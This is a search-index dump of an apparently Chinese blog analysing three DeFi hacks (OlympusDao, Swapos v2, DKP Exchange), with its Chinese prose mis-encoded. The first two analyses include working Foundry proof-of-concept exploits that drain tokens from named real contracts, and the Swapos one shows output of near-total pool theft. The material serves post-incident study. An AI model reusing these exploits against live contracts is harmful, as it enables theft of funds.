[{"categories":["security"],"content":"OlympusDao BondFixedExpiryTeller æ”»å‡»æ¡ˆä¾‹åˆ†æ ","date":"2023-04-27","objectID":"/olympusdao-attack-analysis/:0:0","tags":["defi"],"title":"BondFixedExpiryTeller æ”»å‡»æ¡ˆä¾‹åˆ†æ","uri":"/olympusdao-attack-analysis/"},{"categories":["security"],"content":"æ¼æ´åˆ†æ æ”»å‡»å‘ç”Ÿåœ¨ä»¥å¤ªåŠé“¾https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf å­˜åœ¨æ¼æ´çš„åˆçº¦åœ°å€ä¸º: 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156 åœ¨å…¶ä¸­çš„BondFixedExpiryTeller.solå­˜åœ¨redeemå‡½æ•°, ä»£ç å¦‚ä¸‹: function redeem(ERC20BondToken token_, uint256 amount_) external override nonReentrant { if (uint48(block.timestamp) \u003c token_.expiry()) revert Teller_TokenNotMatured(token_.expiry()); token_.burn(msg.sender, amount_); token_.underlying().transfer(msg.sender, amount_); } è¿™ä¸ªå‡½æ•°çš„å«ä¹‰æ˜¯\"å­˜åœ¨tokenA, å°†tokenAæ¯æ‰ä¸€å®šæ•°é‡, å¹¶å°†ç›¸åŒæ•°é‡çš„tokenBå‘é€ç»™msg.sender, å…¶ä¸­tokenBç”±tokenAçš„underlying()å‡½æ•°æ¥æŒ‡å®š\" å…¶ä¸­ token_.underlying().transfer(msg.sender, amount_);å°±æ˜¯ç›´æ¥è°ƒç”¨çš„tokenXçš„transfer()å‡½æ•°å°†å…¶è½¬ç»™msg.sender, ä¹Ÿå°±æ˜¯è¯´è¯¥åˆçº¦ä¸­å¦‚æœå­˜åœ¨ä»»ä½•IERC20(æˆ–ç±»ä¼¼çš„æœ‰è½¬è´¦å‡½æ•°çš„å¸)éƒ½å¯ä»¥é€šè¿‡è¿™å¥ä»£ç è½¬ç»™msg.sender. åˆçº¦ä¸­æœ‰å“ªäº›å¸å‘¢? åœ¨åŒºå—é“¾æµè§ˆå™¨ä¸Šå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šOHMè¢«è½¬åˆ°äº†è¯¥åˆçº¦, æŸ¥çœ‹OHMçš„ä»£ç  contract OlympusERC20Token is ERC20Permit, IOHM, OlympusAccessControlled { } interface IOHM is IERC20 { } ","date":"2023-04-27","objectID":"/olympusdao-attack-analysis/:1:0","tags":["defi"],"title":"BondFixedExpiryTeller æ”»å‡»æ¡ˆä¾‹åˆ†æ","uri":"/olympusdao-attack-analysis/"},{"categories":["security"],"content":"POC // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; interface IERC20 { function balanceOf(address owner) external view returns (uint256); function decimals() external view returns (uint8); } interface IBondFixedExpiryTeller { function redeem(address token_, uint256 amount_) external; } IERC20 constant OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5); //buggy: IBondFixedExpiryTeller constant BondFixedExpiryTeller = IBondFixedExpiryTeller( 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156 ); contract FakeToken { function underlying() external pure returns (address) { //æŒ‡å‘ OHM //è¿™æ ·redeem()å‡½æ•°ä¸­çš„ // token_.underlying().transfer(msg.sender, amount_); // å°±å˜æˆäº† // OHM.transfer(msg.sender, amount_); return address(OHM); } // ç»•è¿‡require function expiry() external pure returns (uint48 _expiry) { return 1; } function burn(address, uint256) external {} } //attack TX: https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf contract Hack is Test { function setUp() public { vm.createSelectFork(\"theNet\", 15794360); //ETH } function testPoc() public { FakeToken ft = new FakeToken(); BondFixedExpiryTeller.redeem(address(ft), 1000 * 10 ** OHM.decimals()); emit log_named_decimal_uint( \"OHM balance:\", OHM.balanceOf(address(this)), OHM.decimals() ); } } ","date":"2023-04-27","objectID":"/olympusdao-attack-analysis/:2:0","tags":["defi"],"title":"BondFixedExpiryTeller æ”»å‡»æ¡ˆä¾‹åˆ†æ","uri":"/olympusdao-attack-analysis/"},{"categories":["security"],"content":"saving gasçš„é”… https://twitter.com/CertiKAlert/status/1647530789947469825 ä»¥æ”»å‡»è€…çš„è¿™ä¸ªtxä¸ºä¾‹: https://etherscan.io/tx/0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575 ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:0:0","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"æ¼æ´åˆ†æ å­˜åœ¨æ¼æ´çš„åˆçº¦åœ°å€ä¸º 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f åœ¨å…¶åˆçº¦ä»£ç SwaposV2Pair.sol ä¸­ æä¾›äº†ä¸€ä¸ªå¤–éƒ¨å‡½æ•°swap() , ä»£ç å¦‚ä¸‹: function swap( uint amount0Out, uint amount1Out, address to, bytes calldata data ) external lock { require( amount0Out \u003e 0 || amount1Out \u003e 0, \"SwaposV2: INSUFFICIENT_OUTPUT_AMOUNT\" ); (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings require( amount0Out \u003c _reserve0 \u0026\u0026 amount1Out \u003c _reserve1, \"SwaposV2: INSUFFICIENT_LIQUIDITY\" ); uint balance0; uint balance1; { // scope for _token{0,1}, avoids stack too deep errors address _token0 = token0; address _token1 = token1; require(to != _token0 \u0026\u0026 to != _token1, \"SwaposV2: INVALID_TO\"); if (amount0Out \u003e 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens if (amount1Out \u003e 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens if (data.length \u003e 0) ISwaposV2Callee(to).swaposV2Call( msg.sender, amount0Out, amount1Out, data ); balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); } uint amount0In = balance0 \u003e _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; uint amount1In = balance1 \u003e _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0; require( amount0In \u003e 0 || amount1In \u003e 0, \"SwaposV2: INSUFFICIENT_INPUT_AMOUNT\" ); { uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(10)); uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(10)); require( balance0Adjusted.mul(balance1Adjusted) \u003e= uint(_reserve0).mul(_reserve1).mul(1000 ** 2), \"SwaposV2: K\" ); } _update(balance0, balance1, _reserve0, _reserve1); emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to); } æ³¨æ„åˆ°å…¶ä¸­çš„è¿™ä¸¤è¡Œä»£ç : if (amount0Out \u003e 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens if (amount1Out \u003e 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens å…¶ä¸­_safeTransferä»£ç å¦‚ä¸‹: function _safeTransfer(address token, address to, uint value) private { (bool success, bytes memory data) = token.call( abi.encodeWithSelector(SELECTOR, to, value) ); require( success \u0026\u0026 (data.length == 0 || abi.decode(data, (bool))), \"SwaposV2: TRANSFER_FAILED\" ); } ä¹Ÿå°±æ˜¯è¯´ swap()å‡½æ•°å…è®¸å¤–éƒ¨è°ƒç”¨è€…å°†æ± å­çš„ä¸­çš„token0æˆ–token1 å‘é€ç»™ä»»æ„æ¥æ”¶æ–¹ ğŸ˜± å½“ç„¶, ä»£ç ä¸­æœ‰ä¸€å †requireè¯­å¥ç”¨äºæ¡ä»¶æ£€æŸ¥, åªè¦èƒ½ç»•è¿‡è¿™äº›æ£€æŸ¥, å°±èƒ½ä»»æ„è½¬è´¦ å‡è®¾æ”»å‡»è€…è¦å°†æ± ä¸­çš„å¤§éƒ¨åˆ†token0 åˆ’è½¬ç»™è‡ªå·±: SwaposV2.swap(\u003c90% of token0 in the pool\u003e, 0, \u003caddress of attacker\u003e, \"\") é‚£ä¹ˆæ”»å‡»è€…æˆ‘ä»¬èƒ½ä¸èƒ½ç»•è¿‡è¿™äº›require ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:1:0","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"require 1 require( amount0Out \u003e 0 || amount1Out \u003e 0, \"SwaposV2: INSUFFICIENT_OUTPUT_AMOUNT\" ); æ£€æŸ¥amount0Outå’Œamount1Out è‡³å°‘ä¸€ä¸ªå¤§äº0, æ”»å‡»è€…ä¼ å…¥çš„amount0Outå‚æ•°ä¸º\"90% of token0 in the pool\", æ²¡æ¯›ç—… ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:1:1","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"require 2 (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); require( amount0Out \u003c _reserve0 \u0026\u0026 amount1Out \u003c _reserve1, \"SwaposV2: INSUFFICIENT_LIQUIDITY\" ); è·å–åº“å­˜, æ£€æŸ¥è¾“å‡ºå°äºåº“å­˜, æ”»å‡»è€…åªè¦90% ğŸ¤ª ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:1:2","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"require 3 require(to != _token0 \u0026\u0026 to != _token1, \"SwaposV2: INVALID_TO\"); ç¡®ä¿æ¥æ”¶æ–¹ä¸æ˜¯token0æˆ–token1, æ²¡é—®é¢˜, æ˜¯æ”»å‡»è€… ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:1:3","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"require 4 balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); uint amount0In = balance0 \u003e _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; uint amount1In = balance1 \u003e _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0; require( amount0In \u003e 0 || amount1In \u003e 0, \"SwaposV2: INSUFFICIENT_INPUT_AMOUNT\" ); é‡ç‚¹é€»è¾‘åˆ†æ: å¦‚æœå½“å‰ä½™é¢ å¤§äº å…ˆå‰çš„åº“å­˜å‡å»è¾“å‡ºçš„æ•°é‡ï¼Œ åˆ™è¾“å…¥çš„æ•°é‡ä¸ºä½™é¢å‡å»å…ˆå‰çš„åº“å­˜å‡å»è¾“å‡ºçš„æ•°é‡ï¼Œ å¦åˆ™ä¸º0.æ¯”å¦‚å…ˆå‰çš„åº“å­˜_reserve0:100ï¼Œ è¾“å‡º:amount0Out10ï¼Œ 100-10=90ï¼Œ å¦‚æœå½“å‰ä½™é¢balance0å¤§äº90ï¼Œåˆ™è¾“å…¥çš„æ•°é‡ä¸ºå½“å‰ä½™é¢banlance0-(100-10) è¿™é‡Œçš„é€»è¾‘å¾ˆå…³é”®ï¼šå› ä¸ºæŒ‰ç…§æ­£å¸¸æ€è·¯ï¼Œ å½“å‰ä½™é¢balance0 åº”è¯¥ç­‰äºå…ˆå‰ä½™é¢_reserve0å‡å»è¾“å‡ºçš„æ•°é‡amount0Out ä¸ºäº†ç»•è¿‡è¿™ä¸ªrequireï¼šå¯ä»¥å…ˆå‘è¿™ä¸ªåˆçº¦å­˜ç‚¹tokenï¼Œå¦‚æœä½ è¦åˆ’è½¬token0ï¼Œåˆ™å…ˆå­˜ç‚¹token0ï¼Œä¿è¯balance0 \u003e _reserve0 - amount0Out ?? ä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡ï¼Œ æŒ‰ç…§æ­£å¸¸æ€è·¯ï¼šå½“å‰ä½™é¢åº”è¯¥å§‹ç»ˆç­‰äºå…ˆå‰åº“å­˜å‡å»è¾“å‡ºé¢å•Šï¼Ÿ è¿™æ˜¯å› ä¸ºå½“å‰ä½™é¢balance0æ˜¯æœ€æ–°çš„å€¼ï¼šIERC20(token0).balanceOf(address(this)); è€Œå…ˆå‰çš„åº“å­˜_reserve0æ ¹æœ¬å°±ä¸æ˜¯æœ€æ–°çš„å€¼ï¼šå…¶æ˜¯é€šè¿‡getReserves()å‡½æ•°å¾—åˆ°çš„ï¼Œ å…¶å€¼æ˜¯åœ¨_update()è¢«æ›´æ–°çš„ï¼Œè€Œæ›´æ–°å‘ç”Ÿåœ¨è¿‡å»çš„mint(), burn(), sync(), swap()ç­‰ (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings //... function getReserves() public view returns ( uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast ) { _reserve0 = reserve0; _reserve1 = reserve1; _blockTimestampLast = blockTimestampLast; } //... function _update( uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1 ) private{ //.. reserve0 = uint112(balance0); reserve1 = uint112(balance1); blockTimestampLast = blockTimestamp; emit Sync(reserve0, reserve1); } æ¯”å¦‚åº“å­˜ï¼ˆæ—§å€¼ï¼‰100ï¼Œ ï¼Œå­˜å…¥1ï¼Œ åˆ’èµ°90ï¼Œ é‚£ä¹ˆbalance0 ä¸º 101-90 = 11 ï¼Œ è€Œ_reserve0 - amount0Out = 100 - 90 =10ï¼Œ æ»¡è¶³ 11 \u003e 10, so, amount0In=10 æ ¹æ®ä»£ç ä½œè€…çš„æ³¨é‡Š, ä½¿ç”¨ getReserves()å‡½æ•°æ˜¯ä¸ºäº†èŠ‚çœgas. è¿™éªšæ“ä½œèŠ‚çœå¾—æœ‰ç‚¹è´µå•Š gasè´¹: https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:1:4","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"require 5 uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(10)); uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(10)); require(balance0Adjusted.mul(balance1Adjusted) \u003e=uint(_reserve0).mul(_reserve1).mul(1000 ** 2),\"SwaposV2: K\" ); ä»¥ä¸Šé¢çš„token0åº“å­˜ï¼ˆæ—§å€¼ï¼‰100ï¼Œ ï¼Œå­˜å…¥1ï¼Œ åˆ’èµ°90ä¸ºä¾‹ balance0Adjusted = 1110000 - 1010 = 109000 å‡è®¾token1åº“å­˜100, balance1 = 100 balance1Adjusted = 10010000 - 010 = 1000000 æ»¡è¶³ 1090001000000 \u003e= 10010010001000 å¼€ç»¿ç¯ å…¨éƒ¨requireéƒ½æ»¡è¶³, é‚£ä¹ˆæ”»å‡»è€…çš„ SwaposV2.swap(\u003c90% of token0 in the pool\u003e, 0, \u003caddress of attacker\u003e, \"\") å°±ä¸ä¼šè¢«revert ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:1:5","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"POC // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; // https://twitter.com/CertiKAlert/status/1647530789947469825 interface IWETH { function deposit() external payable; function transfer(address to, uint256 value) external returns (bool); function approve(address guy, uint256 wad) external returns (bool); function withdraw(uint256 wad) external; function balanceOf(address) external view returns (uint256); } interface ISWP { function swap( uint amount0Out, uint amount1Out, address to, bytes calldata data ) external; function getReserves() external view returns ( uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast ); function balanceOf(address) external view returns (uint256); function transfer(address to, uint256 value) external returns (bool); } interface IERC20 { function balanceOf(address owner) external view returns (uint256); function transfer(address to, uint256 value) external returns (bool); } IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); IERC20 constant SWP_Token = IERC20(0x09176F68003c06F190ECdF40890E3324a9589557); // SWP \u003c=\u003e WETH ISWP constant SWPV2_Pool = ISWP(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f); contract Hack is Test { function setUp() public { vm.createSelectFork(\"theNet\", 17057400); deal(address(WETH), address(this), 100); vm.label(address(WETH), \"WETH\"); vm.label(address(SWPV2_Pool), \"SWPV2Pool\"); vm.label(address(SWP_Token), \"SWPTOKEN\"); } function testPoc() public { // ç»•è¿‡ \"SwaposV2: INSUFFICIENT_INPUT_AMOUNT\" WETH.transfer(address(SWPV2_Pool), 10); (uint112 token0, uint112 token1, ) = SWPV2_Pool.getReserves(); emit log_named_decimal_uint( \"[before] token0(SWP_Token) form getReserves in pool\", token0, 18 ); emit log_named_decimal_uint( \"[before] token1(WETH) getReserves in pool\", token1, 18 ); //åˆ’èµ°99% çš„ token0 æˆ– token1éƒ½å¯ä»¥ï¼ŒäºŒé€‰ä¸€ SWPV2_Pool.swap((token0 * 99000) / 100000, 0, address(this), \"\"); (token0, token1, ) = SWPV2_Pool.getReserves(); emit log_named_decimal_uint( \"[after] token0(SWP_Token) form getReserves in pool\", token0, 18 ); emit log_named_decimal_uint( \"[after] token1(WETH) getReserves in pool\", token1, 18 ); //æ•…æŠ€é‡æ–½ï¼Œåˆ’èµ°å¦å¤–ä¸€ä¸ªå¸ SWP_Token.transfer(address(SWPV2_Pool), 10); SWPV2_Pool.swap(0, (token1 * 99000) / 100000, address(this), \"\"); (token0, token1, ) = SWPV2_Pool.getReserves(); emit log_named_decimal_uint( \"[after] token0(SWP_Token) form getReserves in pool\", token0, 18 ); emit log_named_decimal_uint( \"[after] token1(WETH) getReserves in pool\", token1, 18 ); emit log_named_decimal_uint( \"Now, i have SWP: \", SWP_Token.balanceOf(address(this)), 18 ); emit log_named_decimal_uint( \"Now, i have WETH: \", WETH.balanceOf(address(this)), 18 ); } } è¾“å‡º: Running 1 test for test/hack.t.sol:Hack [PASS] testPoc() (gas: 131472) Logs: [before] token0(SWP_Token) form getReserves in pool: 147580.970131255838890994 [before] token1(WETH) getReserves in pool: 131.642780241915502488 [after] token0(SWP_Token) form getReserves in pool: 1475.809701312558388910 [after] token1(WETH) getReserves in pool: 131.642780241915502498 [after] token0(SWP_Token) form getReserves in pool: 1475.809701312558388920 [after] token1(WETH) getReserves in pool: 1.316427802419155025 Now, i have SWP: : 146105.160429943280502074 Now, i have WETH: : 130.326352439496347563 ","date":"2023-04-19","objectID":"/analysis_of_swaposv2_attack/:2:0","tags":["defi"],"title":"Swapos v2 attack æ”»å‡»åˆ†æ","uri":"/analysis_of_swaposv2_attack/"},{"categories":["security"],"content":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:0:0","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"èƒŒæ™¯ æ”»å‡»tx: https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271 è·åˆ©tx: https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01 DKP Exchange åˆçº¦æä¾›äº† DKP token å’Œ BUSDçš„äº¤æ¢åŠŸèƒ½ , ä½†åœ¨å…¶äº¤æ¢å‡½æ•°(exchange)ä¸­ä½¿ç”¨äº†é”™è¯¯çš„DKP tokençš„ä»·æ ¼æŸ¥è¯¢é€»è¾‘, è€Œé­åˆ°äº†é»‘å®¢çš„ä»·æ ¼æ“çºµæ”»å‡». è™½ç„¶åˆçº¦åœ¨äº¤æ¢å‡½æ•°ä¸­åšäº†\"ä¸å…è®¸åˆçº¦(CA)è€Œåªå…è®¸å¤–éƒ¨è´¦æˆ·(EOA)è°ƒç”¨äº¤æ¢å‡½æ•°\", ä½†è¢«è½»æ¾ç»•è¿‡äº† ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:1:0","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"ä»£ç åˆ†æ DKP Exchange çš„ä»£ç å¹¶æ²¡æœ‰verify, æ‰€ä»¥åªèƒ½çœ‹åˆ°å­—èŠ‚ç  0x608060405234801561001057600080fd5b50600436106101c45760003560e01c8063961bdfbf116100f9578063d42568f711610097578063e6db271311610071578063e6db2713146104bf578063f2fde38b146104dd578063fd19016c146104f9578063fdc65aa714610517576101c4565b8063d42568f714610455578063e176895e14610471578063e274a7bc146104a1576101c4565b8063b2d34d55116100d3578063b2d34d55146103cd578063bb11049f146103fd57806...... åˆ°https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683#code æŸ¥çœ‹å®Œæ•´ä»£ç  ä½†å¯ä»¥ä½¿ç”¨åç¼–è¯‘å·¥å…·åç¼–è¯‘ä¸€ä¸‹ è¿™é‡ŒæŸ¥çœ‹å®Œæ•´çš„åç¼–è¯‘åçš„ä»£ç : https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol å…¶exchange()å‡½æ•°å¦‚ä¸‹ function exchange(uint256 varg0) public payable { require(4 + (msg.data.length - 4) - 4 \u003e= 32); 0x2a44(varg0); //é‡ç‚¹ä»£ç 1 require(msg.sender.code.size \u003c= 0, Error('no isContract')); require(varg0 \u003e= stor_9, Error('num \u003e= propor')); v0 = _SafeAdd(varg0, owner_a[msg.sender]); owner_a[msg.sender] = v0; 0x1a69(varg0, stor_10_0_19, msg.sender, _usdt); require(owner_e_0_19.code.size); v1, v2, v3, v4 = owner_e_0_19.staticcall(0xbd52993b, msg.sender).gas(msg.gas); require(v1); MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 \u0026 ~0x1f); require(MEM[64] + RETURNDATASIZE() - MEM[64] \u003e= 96); 0x2a16(v2); 0x2a16(v3); 0x2a16(v4); //é‡ç‚¹ä»£ç 2 v5 = 0x1201(); v6 = 0x1af2(varg0, v5); v7 = 0x1b6d(0xde0b6b3a7640000, v6); v8 = v9 = 0; if (address(v2) != 0) { v10 = 0x1af2(_one, v7); v11 = 0x1b6d(_exchange, v10); v8 = v12 = _SafeAdd(v11, v9); v13 = _SafeAdd(v11, owner_b[address(v2)]); owner_b[address(v2)] = v13; } if (address(v3) != 0) { v14 = 0x1af2(stor_6, v7); v15 = 0x1b6d(_exchange, v14); v8 = v16 = _SafeAdd(v15, v8); v17 = _SafeAdd(v15, owner_b[address(v3)]); owner_b[address(v3)] = v17; } if (address(v4) != 0) { v18 = 0x1af2(_three, v7); v19 = 0x1b6d(_exchange, v18); v8 = v20 = _SafeAdd(v19, v8); v21 = _SafeAdd(v19, owner_b[address(v4)]); owner_b[address(v4)] = v21; } v22 = 0x1af2(stor_8, v7); v23 = 0x1b6d(_exchange, v22); v24 = _SafeAdd(v23, v8); 0x1972(v23, stor_f_0_19, stor_3_0_19); v25 = _SafeSub(v24, v7); 0x1972(v25, msg.sender, stor_3_0_19); } ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:2:0","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"é‡ç‚¹ä»£ç 1 åˆçº¦ä¸­ require(msg.sender.code.size \u003c= 0, Error('no isContract')); è¿™è¡Œä»£ç æ˜¯æ£€æŸ¥å‡½æ•°è°ƒç”¨è€…ä¸èƒ½æ˜¯åˆçº¦, å¼€å‘è€…è¿˜æ˜¯æœ‰ä¸€ç‚¹å®‰å…¨æ„è¯†çš„(ä½†ä¸å¤š), æ€•è¢«é»‘å¹²è„†ä¸è®©åˆçº¦è°ƒç”¨. ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:2:1","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"é‡ç‚¹ä»£ç 2 v5 = 0x1201(); è½¬åˆ°å‡½æ•° 0x1201ä»£ç å¦‚ä¸‹: function 0x1201() private { require(stor_3_0_19.code.size); v0, v1 = stor_3_0_19.balanceOf(_lp).gas(msg.gas); require(v0); // checks call status, propagates error data on error MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 \u0026 ~0x1f); require(MEM[64] + RETURNDATASIZE() - MEM[64] \u003e= 32); 0x2a44(v1); require(_usdt.code.size); v2, v3 = _usdt.balanceOf(_lp).gas(msg.gas); require(v2); // checks call status, propagates error data on error MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 \u0026 ~0x1f); require(MEM[64] + RETURNDATASIZE() - MEM[64] \u003e= 32); 0x2a44(v3); v4 = 0x1af2(0xde0b6b3a7640000, v1); v5 = 0x1b6d(v3, v4); return v5; } å…¶ä¸­0x1b6d function 0x1b6d(uint256 varg0, uint256 varg1) private { require(varg0 \u003e 0, Error('SafeMath: division by zero')); v0 = _SafeDiv(varg1, varg0); return v0; } ä¹Ÿå°±æ˜¯è¯´, å…¶å…ˆæŸ¥è¯¢äº†_lpåœ¨stor_3_0_19å’Œ_usdtè¿™ä¸¤ä¸ªtokenä¸Šçš„ä½™é¢, ç„¶åè¿”å›å€¼æ˜¯ä¸¤ä¸ªæ•°ç›¸é™¤, å—¯, å—…åˆ°äº†ä¸å®‰å…¨çš„å‘³é“~ ç»§ç»­ææ¸…æ¥š_lp ,stor_3_0_19å’Œ_usdt åˆ†åˆ«æŒ‡çš„ä»€ä¹ˆ: æŸ¥çœ‹åç¼–è¯‘ä»£ç çš„å¼€å¤´éƒ¨åˆ† uint160 _lp; // STORAGE[0x1] bytes 0 to 19 address _usdt; // STORAGE[0x2] bytes 0 to 19 address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19 å®ƒä»¬åˆ†åˆ«åœ¨slot1, slot2, solt3, ä¸ºäº†è¯»å‡ºä»–ä»¬å€¼,æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸‹å°å·¥å…·: https://github.com/yinhui1984/GetStorageAt ~/Doc/github/hac/DKPDemo â¯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 1 Using provider: RPC connection http://127.0.0.1:8545 AS HEX: 0x000000000000000000000000be654fa75bad4fd82d3611391fda6628bb000cc7 AS INT: 1086967560541184621808388775946026158076085669063 AS BYTES: b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbeeO\\xa7[\\xadO\\xd8-6\\x119\\x1f\\xdaf(\\xbb\\x00\\x0c\\xc7' AS STRING: Not a string AS ADDRESS: 0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7 ~/Doc/github/hac/DKPDemo â¯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 2 Using provider: RPC connection http://127.0.0.1:8545 AS HEX: 0x00000000000000000000000055d398326f99059ff775485246999027b3197955 AS INT: 489982930986835137684486657990555633941558688085 AS BYTES: b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00U\\xd3\\x982o\\x99\\x05\\x9f\\xf7uHRF\\x99\\x90'\\xb3\\x19yU\" AS STRING: Not a string AS ADDRESS: 0x55d398326f99059fF775485246999027B3197955 ~/Doc/github/hac/DKPDemo â¯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 3 Using provider: RPC connection http://127.0.0.1:8545 AS HEX: 0x000000000000000000000000d06fa1ba7c80f8e113c2dc669a23a9524775cf19 AS INT: 1189959551584444714248724787054917716618572582681 AS BYTES: b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd0o\\xa1\\xba|\\x80\\xf8\\xe1\\x13\\xc2\\xdcf\\x9a#\\xa9RGu\\xcf\\x19' AS STRING: Not a string AS ADDRESS: 0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19 åˆ†åˆ«æ˜¯3ä¸ªåœ°å€ 0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7 : PancakeSwapV2 ä¸Šçš„ä¸€ä¸ªPAIR 0x55d398326f99059fF775485246999027B3197955 : BUSD 0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19 : DKP token ä¹Ÿå°±æ˜¯è¯´0x1201()å‡½æ•°, æŸ¥è¯¢äº† PancakeSwapV2 ä¸Šçš„ä¸€ä¸ªPAIRçš„ BUSD å’Œ DKP ä½™é¢, ç„¶åå°†ä½™é¢ç›¸é™¤å¹¶è¿”å›. ç»§ç»­ç ”ç©¶ä»£ç å‘ç°exchange()å‡½æ•°å°±æ˜¯ç”¨çš„è¿™ä¸ª0x1201()å‡½æ•°è¿›è¡Œçš„ä»·æ ¼æŸ¥è¯¢,ä»¥ä¾¿å°†ä¸€å®šæ•°é‡çš„ç¾å…ƒæ¢æˆDKP ç»™ç”¨æˆ· (å®é™…å°±æ˜¯å®ç°äº†ä¸€ä¸ªä¹°å¸å‡½æ•°) è¿™å°±ç»™äº†é»‘å®¢ä»·æ ¼æ“çºµçš„æœºä¼š. ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:2:2","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"æ¼æ´åˆ©ç”¨ ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:3:0","tags":["defi"],"title":"DKP Exchange 